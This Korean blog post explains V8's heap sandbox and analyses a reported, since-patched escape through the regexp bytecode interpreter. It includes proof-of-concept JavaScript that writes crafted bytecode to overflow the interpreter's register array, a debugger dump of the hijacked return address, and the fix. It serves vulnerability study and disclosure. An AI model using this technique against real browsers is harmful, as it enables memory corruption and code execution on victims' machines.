---
layout: post
title: "V8 Heap Sandbox Escape with Regexp - 1"
categories: v8
author:
  - c0w5un
---

# 1. Introduction

24년 3월 Chrome 123 버전부터 크롬 브라우저의 자바스크립트 엔진인 V8에 힙 메모리 격리(heap sandbox) 보호기법이 적용되었습니다. 이는 V8 격리 공간내에서 발생한 메모리 취약점이 공격 가능성을 내재하여도 공격의 파급력이 격리 공간을 벗어날 수 없게 제한합니다. 공격자 관점에서 설명하면, 취약점을 통해 격리 공간 내부의 읽기 쓰기를 얻어도 격리 공간 외부의 주소를 알아낼 수도 없고, 읽기 쓰기도 불가능하게 만든다고 보면 되겠습니다.

처음 도입되는 대부분의 보호기법이 그렇듯이 이를 우회하는 방법이 존재하며, 지속적으로 연구 및 제보됩니다. 이 글에서는 V8 Heap Sandbox 보호기법이 어떻게 적용되는지 코드와 함께 살펴보고 이를 우회하는 예제를 소개합니다. 또한 본 내용은 V8 익스플로잇에 대한 어느정도 지식 (addrof, fakeobj 프리미티브 등)이 있다는 가정하에 글을 작성하였으니 참고 부탁드립니다.

이 글의 첫 번째 시리즈에서는 V8 Heap Sandbox 보호기법 자체에 대해서, 그리고 특정 이슈([issue](https://issues.chromium.org/issues/330404819))에서 해당 보호기법을 어떻게 우회하는지를 소개하고, 두 번째 시리즈에서는 CVE-2023-4069에서 발생하는 Heap Caged AAR/W(Sandbox 내의 메모리 읽기 및 쓰기) 와 첫 번째 시리즈에서 언급하는 보호기법 우회 취약점을 엮어 RCE(Remote Code Execution)를 획득하는 방법에 대해서 소개하겠습니다.

+) V8 Sandbox는 Chrome Sandbox와는 별개이며, Chrome Sandbox의 경우 프로세스 별로 권한에 차등을 두어 신뢰할 수 없는 코드를 실행하는 랜더러 프로세스의 시스템 콜을 제한하는 방식으로 적용됩니다. 반면에, V8 Sandbox는 이 랜더러 프로세스 안에서 실행되는 V8 자바스크립트 엔진에 도입되는 메모리 Sandbox 입니다. 필요에 따라, Chrome Sandbox에 대한 이해를 원하시면 ([참조 [15]](https://chromium.googlesource.com/chromium/src/+/HEAD/docs/design/sandbox.md))를 참고해주세요.

# 2. V8 heap sandbox

[참조 [1]](https://chromium.googlesource.com/v8/v8.git/+/refs/heads/main/src/sandbox/README.md)에 따르면 V8이 실행하는 코드를 Sandbox내로 제한하여 동일한 프로세스 내의 다른 메모리와 격리함으로써 일반적인 V8 취약점의 영향력을 제한한다고 나와있습니다. 또한 이는 도입된 격리공간 내에서 사용되는 원시 포인터(raw pointer)를 인덱스나 오프셋 형태로 참조하여 64비트 포인터의 값 전부를 알 수 없게 합니다.

아래의 그림은 [참조 [2]](https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8/edit?tab=t.0#heading=h.xzptrog8pyxf)에서 사용된 V8 Sandbox 도식화 입니다. 빨간색 부분 및 실선이 오프셋, 초록색 부분 및 점선이 인덱스에 해당합니다.

![V8 sandbox 도식화](/_images/v8_sandbox_escape/2024-11-21_23-59.png)

V8 sandbox 도식화

오프셋으로 참조하는 경우는 동일한 V8 Sandbox내에 있는 경우에 활용되고, 인덱스의 경우는 V8 Sandbox 외부에 있는 포인터를 참조할 때 활용됩니다. 이 두 경우에 대해서 살펴보도록 하겠습니다.

- offset(pointer compression)

원시 포인터가 변환되는 형태인 인덱스와 오프셋 중 오프셋의 경우 압축 포인터(Pointer Compression) 형태로 2020년에 이미 적용된 상태입니다. [참조 [2]](https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8/edit?tab=t.0#heading=h.xzptrog8pyxf) 서두와 [참조 [10]](https://v8.dev/blog/pointer-compression)에서 해당 내용을 찾아볼 수 있는데, 이를 요약하면 다음과 같습니다.

64비트 체계에서 포인터 값에서 실질적으로 사용되는 부분은 하위 32bit이므로 상위 32bit를 `base`로 대부분의 경우에 동일하기 때문에 이 값을 레지스터에 저장하고 하위 32bit만을 메모리에 저장합니다.

```cpp
                    |----- 32 bits -----|----- 32 bits -----|
Pointer:            |________base_______|______offset_____w1|

                    |----- 32 bits -----|----- 32 bits -----|
Compressed pointer:                     |______offset_____w1|
Compressed Smi:                         |____int31_value___0|
```

Smi(Small Integer)과 pointer의 구분은 최하위 1비트로 구별하고 압축된 포인터를 참조할 때는 레지스터에 저장된 `base` 값과의 연산을 통하여 원시 포인터 형태로 변환 후 참조하게 됩니다.

아래 코드는 실질적으로 압축 포인터를 실제 원시 포인터로 변환하는 부분입니다.

```cpp
// static
template <typename T, typename CompressionScheme>
Address TaggedMember<T, CompressionScheme>::tagged_to_full(
    Tagged_t tagged_value) {
#ifdef V8_COMPRESS_POINTERS
  if constexpr (std::is_same_v<Smi, T>) {
    V8_ASSUME(HAS_SMI_TAG(tagged_value));
    return CompressionScheme::DecompressTaggedSigned(tagged_value);
  } else {
    return CompressionScheme::DecompressTagged(CompressionScheme::base(),
                                               tagged_value);
  }
#else
  return tagged_value;
#endif
}

// static
template <typename Cage>
template <typename TOnHeapAddress>
Address V8HeapCompressionSchemeImpl<Cage>::DecompressTagged(
    TOnHeapAddress on_heap_addr, Tagged_t raw_value) {
#ifdef V8_COMPRESS_POINTERS
  Address cage_base = base();
#ifdef V8_COMPRESS_POINTERS_IN_MULTIPLE_CAGES
  DCHECK_WITH_MSG(cage_base != kNullAddress,
                  "V8HeapCompressionSchemeImpl::base is not initialized for "
                  "current thread");
#endif  // V8_COMPRESS_POINTERS_IN_MULTIPLE_CAGES
#else
  Address cage_base = GetPtrComprCageBaseAddress(on_heap_addr); // --- [a]
#endif  // V8_COMPRESS_POINTERS
  Address result = cage_base + static_cast<Address>(raw_value); // --- [b]
  V8_ASSUME(static_cast<uint32_t>(result) == raw_value);
  return result;
}
```

코드 [a] 에서 위에서 언급한 `base` 를 가져오고, 코드 [b]에서 offset을 가져와 덧셈 연산으로 원시 포인터를 가져오는 모습을 확인할 수 있습니다.

- index

원시 포인터가 변환되는 형태인 인덱스와 오프셋 중 인덱스의 경우입니다. 외부 포인터를 참조하는 경우 테이블을 만들고 해당 테이블을 인덱스로 참조하여 외부 포인터를 참조하게 됩니다. 이 외부 포인터는 External Pointer Table, Code Pointer Table, Trusted Pointer Table로 구분하여 테이블을 따로 관리합니다. 각 포인터의 특징은 다음과 같습니다.

- External Pointer Table: 샌드박스 내에서 V8이 아닌 외부 객체(DOM, 등)를 참조하기 위한 테이블.
- Code Pointer Table: External Pointer Table과 마찬가지로, 실행 가능한 머신 코드에 대한 포인터를 보호하기 위해 해당 포인터 전용으로 사용하기 위한 테이블. CFI(Control Flow Integrity)를 구현
- Trusted Pointer Table: V8이 신뢰할 수 있는 포인터이며 공격자에게 손상되면 안되는 포인터를 위한 테이블. 바이트 코드 컨테이너나 JIT 생성 코드를 위한 메타데이터가 이에 해당

특정 원시 포인터를 인덱스 형태로 바꾸기 위해서 단순히 개발자 마음대로 변경하는 것이 아닌 정형화된 패턴으로 이를 처리합니다. ReadProtectedPointerField, WriteProtectedPointerField함수와 같이 이미 신뢰성이 보장된 포인터 접근 함수를 추가함으로써 구현하게 됩니다. 이는 Garbage Collector(GC), Code Stub Assembler(CSA) 최적화 등등과 같이 V8 내에서 원시 포인터에 대한 처리 기능이 존재하기 때문입니다. 아래는 인덱스를 구현하는 코드 예시입니다.

```cpp
#define PROTECTED_POINTER_ACCESSORS(holder, name, type, offset)              \
  static_assert(std::is_base_of<TrustedObject, holder>::value);              \
  Tagged<type> holder::name() const {                                        \
    DCHECK(has_##name());                                                    \
    return Cast<type>(ReadProtectedPointerField(offset));                    \
  }                                                                          \
  void holder::set_##name(Tagged<type> value, WriteBarrierMode mode) {       \
    WriteProtectedPointerField(offset, value);                               \
    CONDITIONAL_PROTECTED_POINTER_WRITE_BARRIER(*this, offset, value, mode); \
  }                                                                          \
  bool holder::has_##name() const {                                          \
    return !IsProtectedPointerFieldEmpty(offset);                            \
  }                                                                          \
  void holder::clear_##name() { return ClearProtectedPointerField(offset); }
  

Tagged<TrustedObject> TrustedObject::ReadProtectedPointerField(
    int offset) const {
  return TaggedField<TrustedObject, 0, TrustedSpaceCompressionScheme>::load(
      *this, offset);
}

// static
template <typename T, int kFieldOffset, typename CompressionScheme>
typename TaggedField<T, kFieldOffset, CompressionScheme>::PtrType
TaggedField<T, kFieldOffset, CompressionScheme>::load(Tagged<HeapObject> host,
                                                      int offset) {
  Tagged_t value = *location(host, offset);
  DCHECK_NE(kFieldOffset + offset, HeapObject::kMapOffset);
  return PtrType(tagged_to_full(host.ptr(), value));
}
```

- 정리

결론적으로 V8 Sandbox라 함은 V8 Sandbox 내에서 원시 포인터를 전부 인덱스와 오프셋 형태로 변환함으로써 공격자가 샌드박스 내의 읽기 쓰기 프리미티브를 획득하였어도 포인터 정보 획득 및 흐름 제어까지 도달하지 못하게 막는 보호기법이라고 이해하면 되겠습니다. 이로써 공격자의 Exploit 단계에 한 단계가 추가되었다고 볼 수 있습니다. V8 버그로 메모리를 오염시킨뒤에 V8 Sandbox를 탈출해야 온전한 AAR/W를 획득할 수 있습니다. 취약점 갯수의 관점으로서는 Chrome 브라우저 랜더러 프로세스에서 쉘코드를 실행하기 위해 취약점이 두 개가 필요하게 됩니다. 변경된 익스플로잇 흐름도에 대해서는 다음과 같습니다. ([참조 [14]](https://saelo.github.io/presentations/offensivecon_24_the_v8_heap_sandbox.pdf))

![image.png](/_images/v8_sandbox_escape/Exploit_flow.png)

# 3. Escape with Regexp

[참조 [12]](https://issues.chromium.org/issues/330404819)에서 제보된 Sandbox Escape 방법에 대해서 소개하도록 하겠습니다. 먼저, 해당 이슈에서 V8 Heap Sandbox를 탈출하는데 사용되는 컴포넌트가 정규표현식이므로 해당 내용을 [참조 [11]](https://v8.dev/blog/non-backtracking-regexp)을 참고하여 간략하게 설명하겠습니다. 

## 3-1. Regexp

정규표현식(RegExp)는 오토마타와 바이트코드라고 소개되어 있습니다. 예를 들어 `/(a*)*b/` 와 같은 정규표현식을 아래와 같은 오토마톤으로 표현할 수 있습니다.

![image.png](/_images/v8_sandbox_escape/regexp.png)

위의 오토마톤의 동작은 `FORK`, `CONSUME` , `JMP`, `ACCEPT` 으로 총 4개의 동작을 갖고 있습니다. 예시에서 살펴본 `/(a*)*b/` 를 표현한 오토마톤을 바이트코드 형태로 간략하게 표현하면 아래와 같습니다. V8에서는 각 바이트코드 별로 필요한 인자와 수행 동작을 지정하여 일종의 가상머신 형태로 이를 구현하였습니다.

```cpp
const code = [
  {opcode: 'FORK', forkPc: 4},
  {opcode: 'CONSUME', char: '1'},
  {opcode: 'CONSUME', char: '2'},
  {opcode: 'JMP', jmpPc: 6},
  {opcode: 'CONSUME', char: 'a'},
  {opcode: 'CONSUME', char: 'b'},
  {opcode: 'ACCEPT'}
];

let ip = 0; // Input position.
let pc = 0; // Program counter: index of the next instruction.
const stack = []; // Backtrack stack.
while (true) {
  const inst = code[pc];
  switch (inst.opcode) {
    case 'CONSUME':
      if (ip < input.length && input[ip] === inst.char) {
        // Input matches what we expect: Continue.
        ++ip;
        ++pc;
      } else if (stack.length > 0) {
        // Wrong input character, but we can backtrack.
        const back = stack.pop();
        ip = back.ip;
        pc = back.pc;
      } else {
        // Wrong character, cannot backtrack.
        return false;
      }
      break;
    case 'FORK':
      // Save alternative for backtracking later.
      stack.push({ip: ip, pc: inst.forkPc});
      ++pc;
      break;
    case 'JMP':
      pc = inst.jmpPc;
      break;
    case 'ACCEPT':
      return true;
  }
}
```

다만, 위의 내용은 이해를 돕기 위해 RegExp를 간단하게 표현한 것이고, 실제로 내부 코드를 확인하게 되면 총 59개의 바이트코드가 존재합니다. 이는 V8 내에서 필요한 연산과 관련된 바이트 코드 명령어를 추가하고 RegExp 최적화를 위해 바이트 코드 명령어를 추가한 부분도 존재합니다. 

```cpp
#define BYTECODE_ITERATOR(V)                                                   \
  V(BREAK, 0, 4)              /* bc8                                        */ \
  V(PUSH_CP, 1, 4)            /* bc8 pad24                                  */ \
  V(PUSH_BT, 2, 8)            /* bc8 pad24 offset32                         */ \
  V(PUSH_REGISTER, 3, 4)      /* bc8 reg_idx24                              */ \
  V(SET_REGISTER_TO_CP, 4, 8) /* bc8 reg_idx24 offset32                     */ \
  V(SET_CP_TO_REGISTER, 5, 4) /* bc8 reg_idx24                              */ \
  V(SET_REGISTER_TO_SP, 6, 4) /* bc8 reg_idx24                              */ \
  V(SET_SP_TO_REGISTER, 7, 4) /* bc8 reg_idx24                              */ \
  V(SET_REGISTER, 8, 8)       /* bc8 reg_idx24 value32                      */ \
  V(ADVANCE_REGISTER, 9, 8)   /* bc8 reg_idx24 value32                      */ \
  V(POP_CP, 10, 4)            /* bc8 pad24                                  */ \
  V(POP_BT, 11, 4)            /* bc8 pad24                                  */ \
  V(POP_REGISTER, 12, 4)      /* bc8 reg_idx24                              */ \
  V(FAIL, 13, 4)              /* bc8 pad24                                  */ \
  V(SUCCEED, 14, 4)           /* bc8 pad24                                  */ \
  V(ADVANCE_CP, 15, 4)        /* bc8 offset24                               */ \
  /* Jump to another bytecode given its offset.                             */ \
  /* Bit Layout:                                                            */ \
  /* 0x00 - 0x07:   0x10 (fixed) Bytecode                                   */ \
  /* 0x08 - 0x1F:   30x00 (unused) Padding                                   */ \
  /* 0x20 - 0x3F:   Address of bytecode to jump to                          */ \
  V(GOTO, 16, 8) /* bc8 pad24 addr32                           */              \
  \
  /* skipped */\
  \
  /* LOAD_CURRENT_CHAR, CHECK_GT, CHECK_BIT_IN_TABLE, GOTO and              */ \
  /* and ADVANCE_CP_AND_GOTO                                                */ \
  /* Emitted by RegExpBytecodePeepholeOptimization.                         */ \
  /* Bit Layout:                                                            */ \
  /* 0x00 - 0x07    0x3A (fixed) Bytecode                                   */ \
  /* 0x08 - 0x1F    Load character offset from current position             */ \
  /* 0x20 - 0x2F    Number of characters to advance                         */ \
  /* 0x30 - 0x3F    Character to check if it is less than current char      */ \
  /* 0x40 - 0xBF    Bit Table                                               */ \
  /* 0xC0 - 0xDF    Address of bytecode when character is matched           */ \
  /* 0xE0 - 0xFF    Address of bytecode when no match                       */ \
  V(SKIP_UNTIL_GT_OR_NOT_BIT_IN_TABLE, 58, 32)

```

만들어진 바이트 코드는 최종적으로 `RawMatch` 함수에서 해석되고 각 바이트 코드 별 등록된 핸들러에 따라 동작하게 됩니다.

```cpp
template <typename Char>
IrregexpInterpreter::Result RawMatch(
    Isolate* isolate, ByteArray code_array, String subject_string,
    base::Vector<const Char> subject, int* output_registers,
    int output_register_count, int total_register_count, int current,
    uint32_t current_char, RegExp::CallOrigin call_origin,
    const uint32_t backtrack_limit) {
  DisallowGarbageCollection no_gc;

// ...

#ifdef DEBUG
  if (v8_flags.trace_regexp_bytecodes) {
    PrintF("\n\nStart bytecode interpreter\n\n");
  }
#endif

  while (true) {
    const uint8_t* next_pc = pc;
    int32_t insn;
    int32_t next_insn;
#if V8_USE_COMPUTED_GOTO
    const void* next_handler_addr;
    DECODE();
    DISPATCH();
#else
    insn = Load32Aligned(pc);
    switch (insn & BYTECODE_MASK) { // ---> HERE
#endif  // V8_USE_COMPUTED_GOTO
    BYTECODE(BREAK) { UNREACHABLE(); }
    BYTECODE(PUSH_CP) {
      ADVANCE(PUSH_CP);
      if (!backtrack_stack.push(current)) {
        return MaybeThrowStackOverflow(isolate, call_origin);
      }
      DISPATCH();
    }
    BYTECODE(PUSH_BT) {
      ADVANCE(PUSH_BT);
      if (!backtrack_stack.push(Load32Aligned(pc + 4))) {
        return MaybeThrowStackOverflow(isolate, call_origin);
      }
      DISPATCH();
    }
    BYTECODE(PUSH_REGISTER) {
      ADVANCE(PUSH_REGISTER);
      if (!backtrack_stack.push(registers[LoadPacked24Unsigned(insn)])) {
        return MaybeThrowStackOverflow(isolate, call_origin);
      }
      DISPATCH();
    }
    BYTECODE(SET_REGISTER) {
      ADVANCE(SET_REGISTER);
      registers[LoadPacked24Unsigned(insn)] = Load32Aligned(pc + 4);
      DISPATCH();
    }
    // ...
  }
```

## 3-2. Escape

먼저, 이슈에서 제보된 POC(Proof of Concept) 코드를 살펴보겠습니다. 

(여담으로 V8에서는 Sandbox test를 수월하게 진행할 수 있도록 api를 제공하고 있습니다. 아래의 코드 [c]가 이에 해당합니다. 이와 관련된 자세한 내용은 [참조 [1]](https://chromium.googlesource.com/v8/v8.git/+/refs/heads/main/src/sandbox/README.md)을 참고 하시면 되겠습니다.)

```jsx
// Flags:  --sandbox-fuzzing
let s = "aaaaa";

var sbxMemView = new Sandbox.MemoryView(0, 0xfffffff8); // --- [c]
var addrOf = (o) => Sandbox.getAddressOf(o);

var dv = new DataView(sbxMemView);

var readHeap4 = (offset) => dv.getUint32(offset, true);
var readHeap8 = (offset) => dv.getBigUint64(offset, true);

var writeHeap1 = (offset, value) => dv.setUint8(offset, value, true);
var writeHeap4 = (offset, value) => dv.setUint32(offset, value, true);
var writeHeap8 = (offset, value) => dv.setBigUint64(offset, value, true);

var regex = /[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*/g;
let addr_regex = addrOf(regex);
let data_addr = readHeap4(addr_regex + 0xc);

regex.exec(s);
let bytecode = readHeap4(data_addr + 0x1b);
writeHeap4(data_addr + 0x2f, 2); // --- [d]

let arr = [];

function set_reg(idx, value) {
    arr.push((idx << 8) & 0xffffff00 | 0x08); // --- [e]
    arr.push(value); // --- [f]
}

function success() {
    arr.push(0x0000000e); // --- [g]
}

let idx = 0x52;
set_reg(idx++,0x41414141); // --- [h]
set_reg(idx++,0x41414141);
success();

for (var i = 0; i < arr.length; i++) {
    writeHeap4(bytecode + 0x7 + 4 * i, arr[i]);
}

regex.exec(s);
```

V8 Sandbox Escape은 공격자가 Caged AAR/W를 얻은 상태를 가정하고 진행합니다. 코드 [e], [f]에서 세팅하는 값은 `SET_REGISTER` 바이트 코드 값과 사용되는 레지스터의 인덱스와 쓰기 값입니다.

```cpp
#define BYTECODE_ITERATOR(V)                                                   \
  V(SET_REGISTER, 8, 8)       /* bc8 reg_idx24 value32                      */ \
  V(SUCCEED, 14, 4)           /* bc8 pad24                                  */ \

template <typename Char>
IrregexpInterpreter::Result RawMatch(
    Isolate* isolate, ByteArray code_array, String subject_string,
    base::Vector<const Char> subject, int* output_registers,
    int output_register_count, int total_register_count, int current,
    uint32_t current_char, RegExp::CallOrigin call_origin,
    const uint32_t backtrack_limit) {
  DisallowGarbageCollection no_gc;

// ...
  InterpreterRegisters registers(total_register_count, output_registers,
                                 output_register_count);
// ...
  while (true) {
    const uint8_t* next_pc = pc;
    int32_t insn;
    int32_t next_insn;
#if V8_USE_COMPUTED_GOTO
    const void* next_handler_addr;
    DECODE();
    DISPATCH();
#else
    insn = Load32Aligned(pc);
    switch (insn & BYTECODE_MASK) {
#endif  // V8_USE_COMPUTED_GOTO

// ...
    BYTECODE(SET_REGISTER) {
      ADVANCE(SET_REGISTER);
      registers[LoadPacked24Unsigned(insn)] = Load32Aligned(pc + 4);
      DISPATCH();
    }
// ...
	  BYTECODE(SUCCEED) {
      isolate->counters()->regexp_backtracks()->AddSample(
          static_cast<int>(backtrack_count));
      registers.CopyToOutputRegisters();
      return IrregexpInterpreter::SUCCESS;
    }
// ...
}
```

`registers[LoadPacked24Unsigned(insn)] = Load32Aligned(pc + 4);` 부분에서 사용되는 부분이 위에서 언급한 부분에 해당합니다. 여기서 문제점은 `InterpreterRegisters` 클래스에서 선언된 `operator[]` 함수에서 내부 맴버 변수인 `registers_` 를 참조할때 아무런 검증이 없다는 것입니다. 따라서 코드 [h]에서 `RawMatch` 함수 내부에 지역변수로 선언된 `registers` 객체의 `registers_` 맴버 변수를 이용하여 OOB가 발생하게 됩니다.

```cpp
class InterpreterRegisters {
 public:
  using RegisterT = int;

  InterpreterRegisters(int total_register_count, RegisterT* output_registers,
                       int output_register_count)
      : registers_(total_register_count),
        output_registers_(output_registers),
        output_register_count_(output_register_count) {
    // TODO(jgruber): Use int32_t consistently for registers. Currently, CSA
    // uses int32_t while runtime uses int.
    static_assert(sizeof(int) == sizeof(int32_t));
    DCHECK_GE(output_register_count, 2);  // At least 2 for the match itself.
    DCHECK_GE(total_register_count, output_register_count);
    DCHECK_LE(total_register_count, RegExpMacroAssembler::kMaxRegisterCount);
    DCHECK_NOT_NULL(output_registers);

    // Initialize the output register region to -1 signifying 'no match'.
    std::memset(registers_.data(), -1,
                output_register_count * sizeof(RegisterT));
  }

  const RegisterT& operator[](size_t index) const { return registers_[index]; }
  RegisterT& operator[](size_t index) { return registers_[index]; }

 private:
  static constexpr int kStaticCapacity = 64;  // Arbitrary.
  base::SmallVector<RegisterT, kStaticCapacity> registers_;
```

이어서 코드 [h]의 경우 바이트 코드 흐름을 끝내기 위해서 `SUCCEED` 코드를 추가해주는 부분이고, 코드 [d]의 경우 `RawMatch` 를 호출하는 CallStack에 존재하는 함수 중에 `MatchForCallFromJs` 함수에서 `regexp_obj.MarkedForTierUp())` 함수의 반환 값을 0으로 만들기 위하여 추가하는 부분입니다.

```cpp
// This method is called through an external reference from RegExpExecInternal
// builtin.
IrregexpInterpreter::Result IrregexpInterpreter::MatchForCallFromJs(
    Address subject, int32_t start_position, Address, Address,
    int* output_registers, int32_t output_register_count,
    RegExp::CallOrigin call_origin, Isolate* isolate, Address regexp) {
  DCHECK_NOT_NULL(isolate);
  DCHECK_NOT_NULL(output_registers);
  DCHECK(call_origin == RegExp::CallOrigin::kFromJs);

  DisallowGarbageCollection no_gc;
  DisallowJavascriptExecution no_js(isolate);
  DisallowHandleAllocation no_handles;
  DisallowHandleDereference no_deref;

  String subject_string = String::cast(Object(subject));
  JSRegExp regexp_obj = JSRegExp::cast(Object(regexp));

  if (regexp_obj.MarkedForTierUp()) { // --- HERE
    // Returning RETRY will re-enter through runtime, where actual recompilation
    // for tier-up takes place.
    return IrregexpInterpreter::RETRY;
  }

  return Match(isolate, regexp_obj, subject_string, output_registers,
               output_register_count, start_position, call_origin);
}

// An irregexp is considered to be marked for tier up if the tier-up ticks
// value reaches zero.
bool JSRegExp::MarkedForTierUp() {
  DCHECK(data().IsFixedArray());

  if (!CanTierUp()) {
    return false;
  }

  return Smi::ToInt(DataAt(kIrregexpTicksUntilTierUpIndex)) == 0; // --- HERE
}
```

최종적으로 코드 [i]에서 바이트 코드 배열에 값을 쓰고, `regex.exec(s)` 함수로 `RawMatch` 함수를 트리거하면 다음과 같이 `pc` 레지스터가 `0x4141414141414141`로 변경되는 것을 확인할 수 있습니다.

```cpp
────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffc9ce04c18│+0x0000: 0x4141414141414141   ← $rsp
0x00007ffc9ce04c20│+0x0008: 0x0000000000000002
0x00007ffc9ce04c28│+0x0010: 0x0000000000000002
0x00007ffc9ce04c30│+0x0018: 0x0000000000000005
0x00007ffc9ce04c38│+0x0020: 0x0000000000000061 ("a"?)
0x00007ffc9ce04c40│+0x0028: 0x0000000000000001
0x00007ffc9ce04c48│+0x0030: 0x0000000000000000
0x00007ffc9ce04c50│+0x0038: 0x0000000000000000
──────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x5c409cf6657d <v8::internal::IrregexpInterpreter::Result+0> pop    r14
   0x5c409cf6657f <v8::internal::IrregexpInterpreter::Result+0> pop    r15
   0x5c409cf66581 <v8::internal::IrregexpInterpreter::Result+0> pop    rbp
 → 0x5c409cf66582 <v8::internal::IrregexpInterpreter::Result+0> ret    
[!] Cannot disassemble from $PC
──────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "d8", stopped 0x5c409cf66582 in v8::internal::(anonymous namespace)::RawMatch<unsigned char> (), reason: SIGSEGV
```

```cpp
d8> % DebugPrint(regex);
DebugPrint: 0x2b7600144dd1: [JSRegExp] in OldSpace
 - map: 0x2b76001881cd <Map[28](HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x2b7600188495 !!!INVALID SHARED ON CONSTRUCTOR!!!<JSObject>
 - elements: 0x2b7600000219 <FixedArray[0]> [HOLEY_ELEMENTS]
 - data: 0x2b7600144e79 <FixedArray[12]>
 - source: 0x2b760019b2fd <String[72]: #[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*>
 - flags: g
 - properties: 0x2b7600000219 <FixedArray[0]>
 - All own properties (excluding elements): {
    0x2b7600004e19: [String] in ReadOnlySpace: #lastIndex: 5 (data field 0), location: in-object
 }
0x2b76001881cd: [Map] in OldSpace
 - type: JS_REG_EXP_TYPE
 - instance size: 28
 - inobject properties: 1
 - elements kind: HOLEY_ELEMENTS
 - unused property fields: 0
 - enum length: invalid
 - stable_map
 - back pointer: 0x2b7600000251 <undefined>
 - prototype_validity cell: 0x2b7600000ab5 <Cell value= 1>
 - instance descriptors (own) #1: 0x2b76001885cd <DescriptorArray[1]>
 - prototype: 0x2b7600188495 !!!INVALID SHARED ON CONSTRUCTOR!!!<JSObject>
 - constructor: 0x2b7600188199 <JSFunction RegExp (sfi = 0x2b7600204af1)>
 - dependent code: 0x2b7600000229 <Other heap object (WEAK_ARRAY_LIST_TYPE)>
 - construction counter: 0

/[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*/g

gef➤  x/16wx 0x2b7600144dd1-1
0x2b7600144dd0: 0x001881cd      0x00000219      0x00000219      0x00144e79
0x2b7600144de0: 0x0019b2fd      0x00000002      0x0000000a      0x000000d9
0x2b7600144df0: 0x00000008      0x00000004      0x00000000      0x001983f7
0x2b7600144e00: 0x00000251      0x00000251      0x0018e565      0x00000219

gef➤  x/32wx 0x2b7600144e79-1
0x2b7600144e78: 0x00000089      0x00000018      0x00000004      0x0019b2fd
0x2b7600144e88: 0x00000002      0x0002a7d1      0xfffffffe      0x00197e05
0x2b7600144e98: 0xfffffffe      0x00000004      0x00000000      0x00000000
0x2b7600144ea8: 0x00000002      0x00000000      0x00000089      0x00000004
0x2b7600144eb8: 0x00144dd1      0x00848484      0x000008fd      0x00000006
0x2b7600144ec8: 0x00000000      0x40966000      0x00000000      0x40dde240
0x2b7600144ed8: 0x00000000      0x3ff80000      0x000008fd      0x0000000a
0x2b7600144ee8: 0x00000000      0x00000002      0x00000000      0x40dde240
```

# 4. Patch

패치는 단순히 `SBXCHECK` 함수를 조작 가능한 영역을 검사하는 코드를 추가하였습니다.

```diff
diff --git a/src/regexp/regexp-interpreter.cc b/src/regexp/regexp-interpreter.cc
index 31fe503..13cf076 100644
--- a/src/regexp/regexp-interpreter.cc
+++ b/src/regexp/regexp-interpreter.cc
@@ -176,6 +176,7 @@
                        int output_register_count)
       : registers_(total_register_count),
         output_registers_(output_registers),
+        total_register_count_(total_register_count),
         output_register_count_(output_register_count) {
     // TODO(jgruber): Use int32_t consistently for registers. Currently, CSA
     // uses int32_t while runtime uses int.
@@ -188,10 +189,17 @@
     // Initialize the output register region to -1 signifying 'no match'.
     std::memset(registers_.data(), -1,
                 output_register_count * sizeof(RegisterT));
+    USE(total_register_count_);
   }
 
-  const RegisterT& operator[](size_t index) const { return registers_[index]; }
-  RegisterT& operator[](size_t index) { return registers_[index]; }
+  const RegisterT& operator[](size_t index) const {
+    SBXCHECK_LT(index, total_register_count_);
+    return registers_[index];
+  }
+  RegisterT& operator[](size_t index) {
+    SBXCHECK_LT(index, total_register_count_);
+    return registers_[index];
+  }
 
   void CopyToOutputRegisters() {
     MemCopy(output_registers_, registers_.data(),
@@ -202,6 +210,7 @@
   static constexpr int kStaticCapacity = 64;  // Arbitrary.
   base::SmallVector<RegisterT, kStaticCapacity> registers_;
   RegisterT* const output_registers_;
+  const int total_register_count_;
   const int output_register_count_;
 };
```

덧붙여서, https://saelo.github.io/presentations/offensivecon_24_the_v8_heap_sandbox.pdf 의 내용에 따르면 신뢰할 수 없는 인덱스에 대한 참조, 불변성이 깨질 수 있는 곳에 `SBXCHECK` 함수를 사용하여 V8 Heap Sandbox를 유지한다고 나와있습니다.

추가적으로 해당 이슈에서 나온 패치는 아니지만, 이후 패치에서 Regexp의 regexp_data 주소 값이 Trust Pointer Table로 옮겨지면서 샌드박스 내에서 바이트 코드에 접근할 수 없게 패치 되었습니다.

```diff
diff --git a/src/objects/js-regexp-inl.h b/src/objects/js-regexp-inl.h
index 180fd84..3dd0a05 100644
--- a/src/objects/js-regexp-inl.h
+++ b/src/objects/js-regexp-inl.h
@@ -25,6 +25,11 @@
 TQ_OBJECT_CONSTRUCTORS_IMPL(JSRegExpResultIndices)
 TQ_OBJECT_CONSTRUCTORS_IMPL(JSRegExpResultWithIndices)
 
+OBJECT_CONSTRUCTORS_IMPL(RegExpData, ExposedTrustedObject)
+OBJECT_CONSTRUCTORS_IMPL(AtomRegExpData, RegExpData)
+OBJECT_CONSTRUCTORS_IMPL(IrRegExpData, RegExpData)
+OBJECT_CONSTRUCTORS_IMPL(RegExpDataWrapper, Struct)
+
 ACCESSORS(JSRegExp, last_index, Tagged<Object>, kLastIndexOffset)
 
 JSRegExp::Type JSRegExp::type_tag() const {
@@ -135,6 +140,99 @@
   SetDataAt(kIrregexpUC16BytecodeIndex, uninitialized);
 }
 
+RegExpData::Type RegExpData::type_tag() const {
+  Tagged<Smi> value = TaggedField<Smi, kTypeTagOffset>::load(*this);
+  return Type(value.value());
+}
+
+void RegExpData::set_type_tag(Type type) {
+  TaggedField<Smi, kTypeTagOffset>::store(
+      *this, Smi::FromInt(static_cast<uint8_t>(type)));
+}
+
+ACCESSORS(RegExpData, source, Tagged<String>, kSourceOffset)
+
+JSRegExp::Flags RegExpData::flags() const {
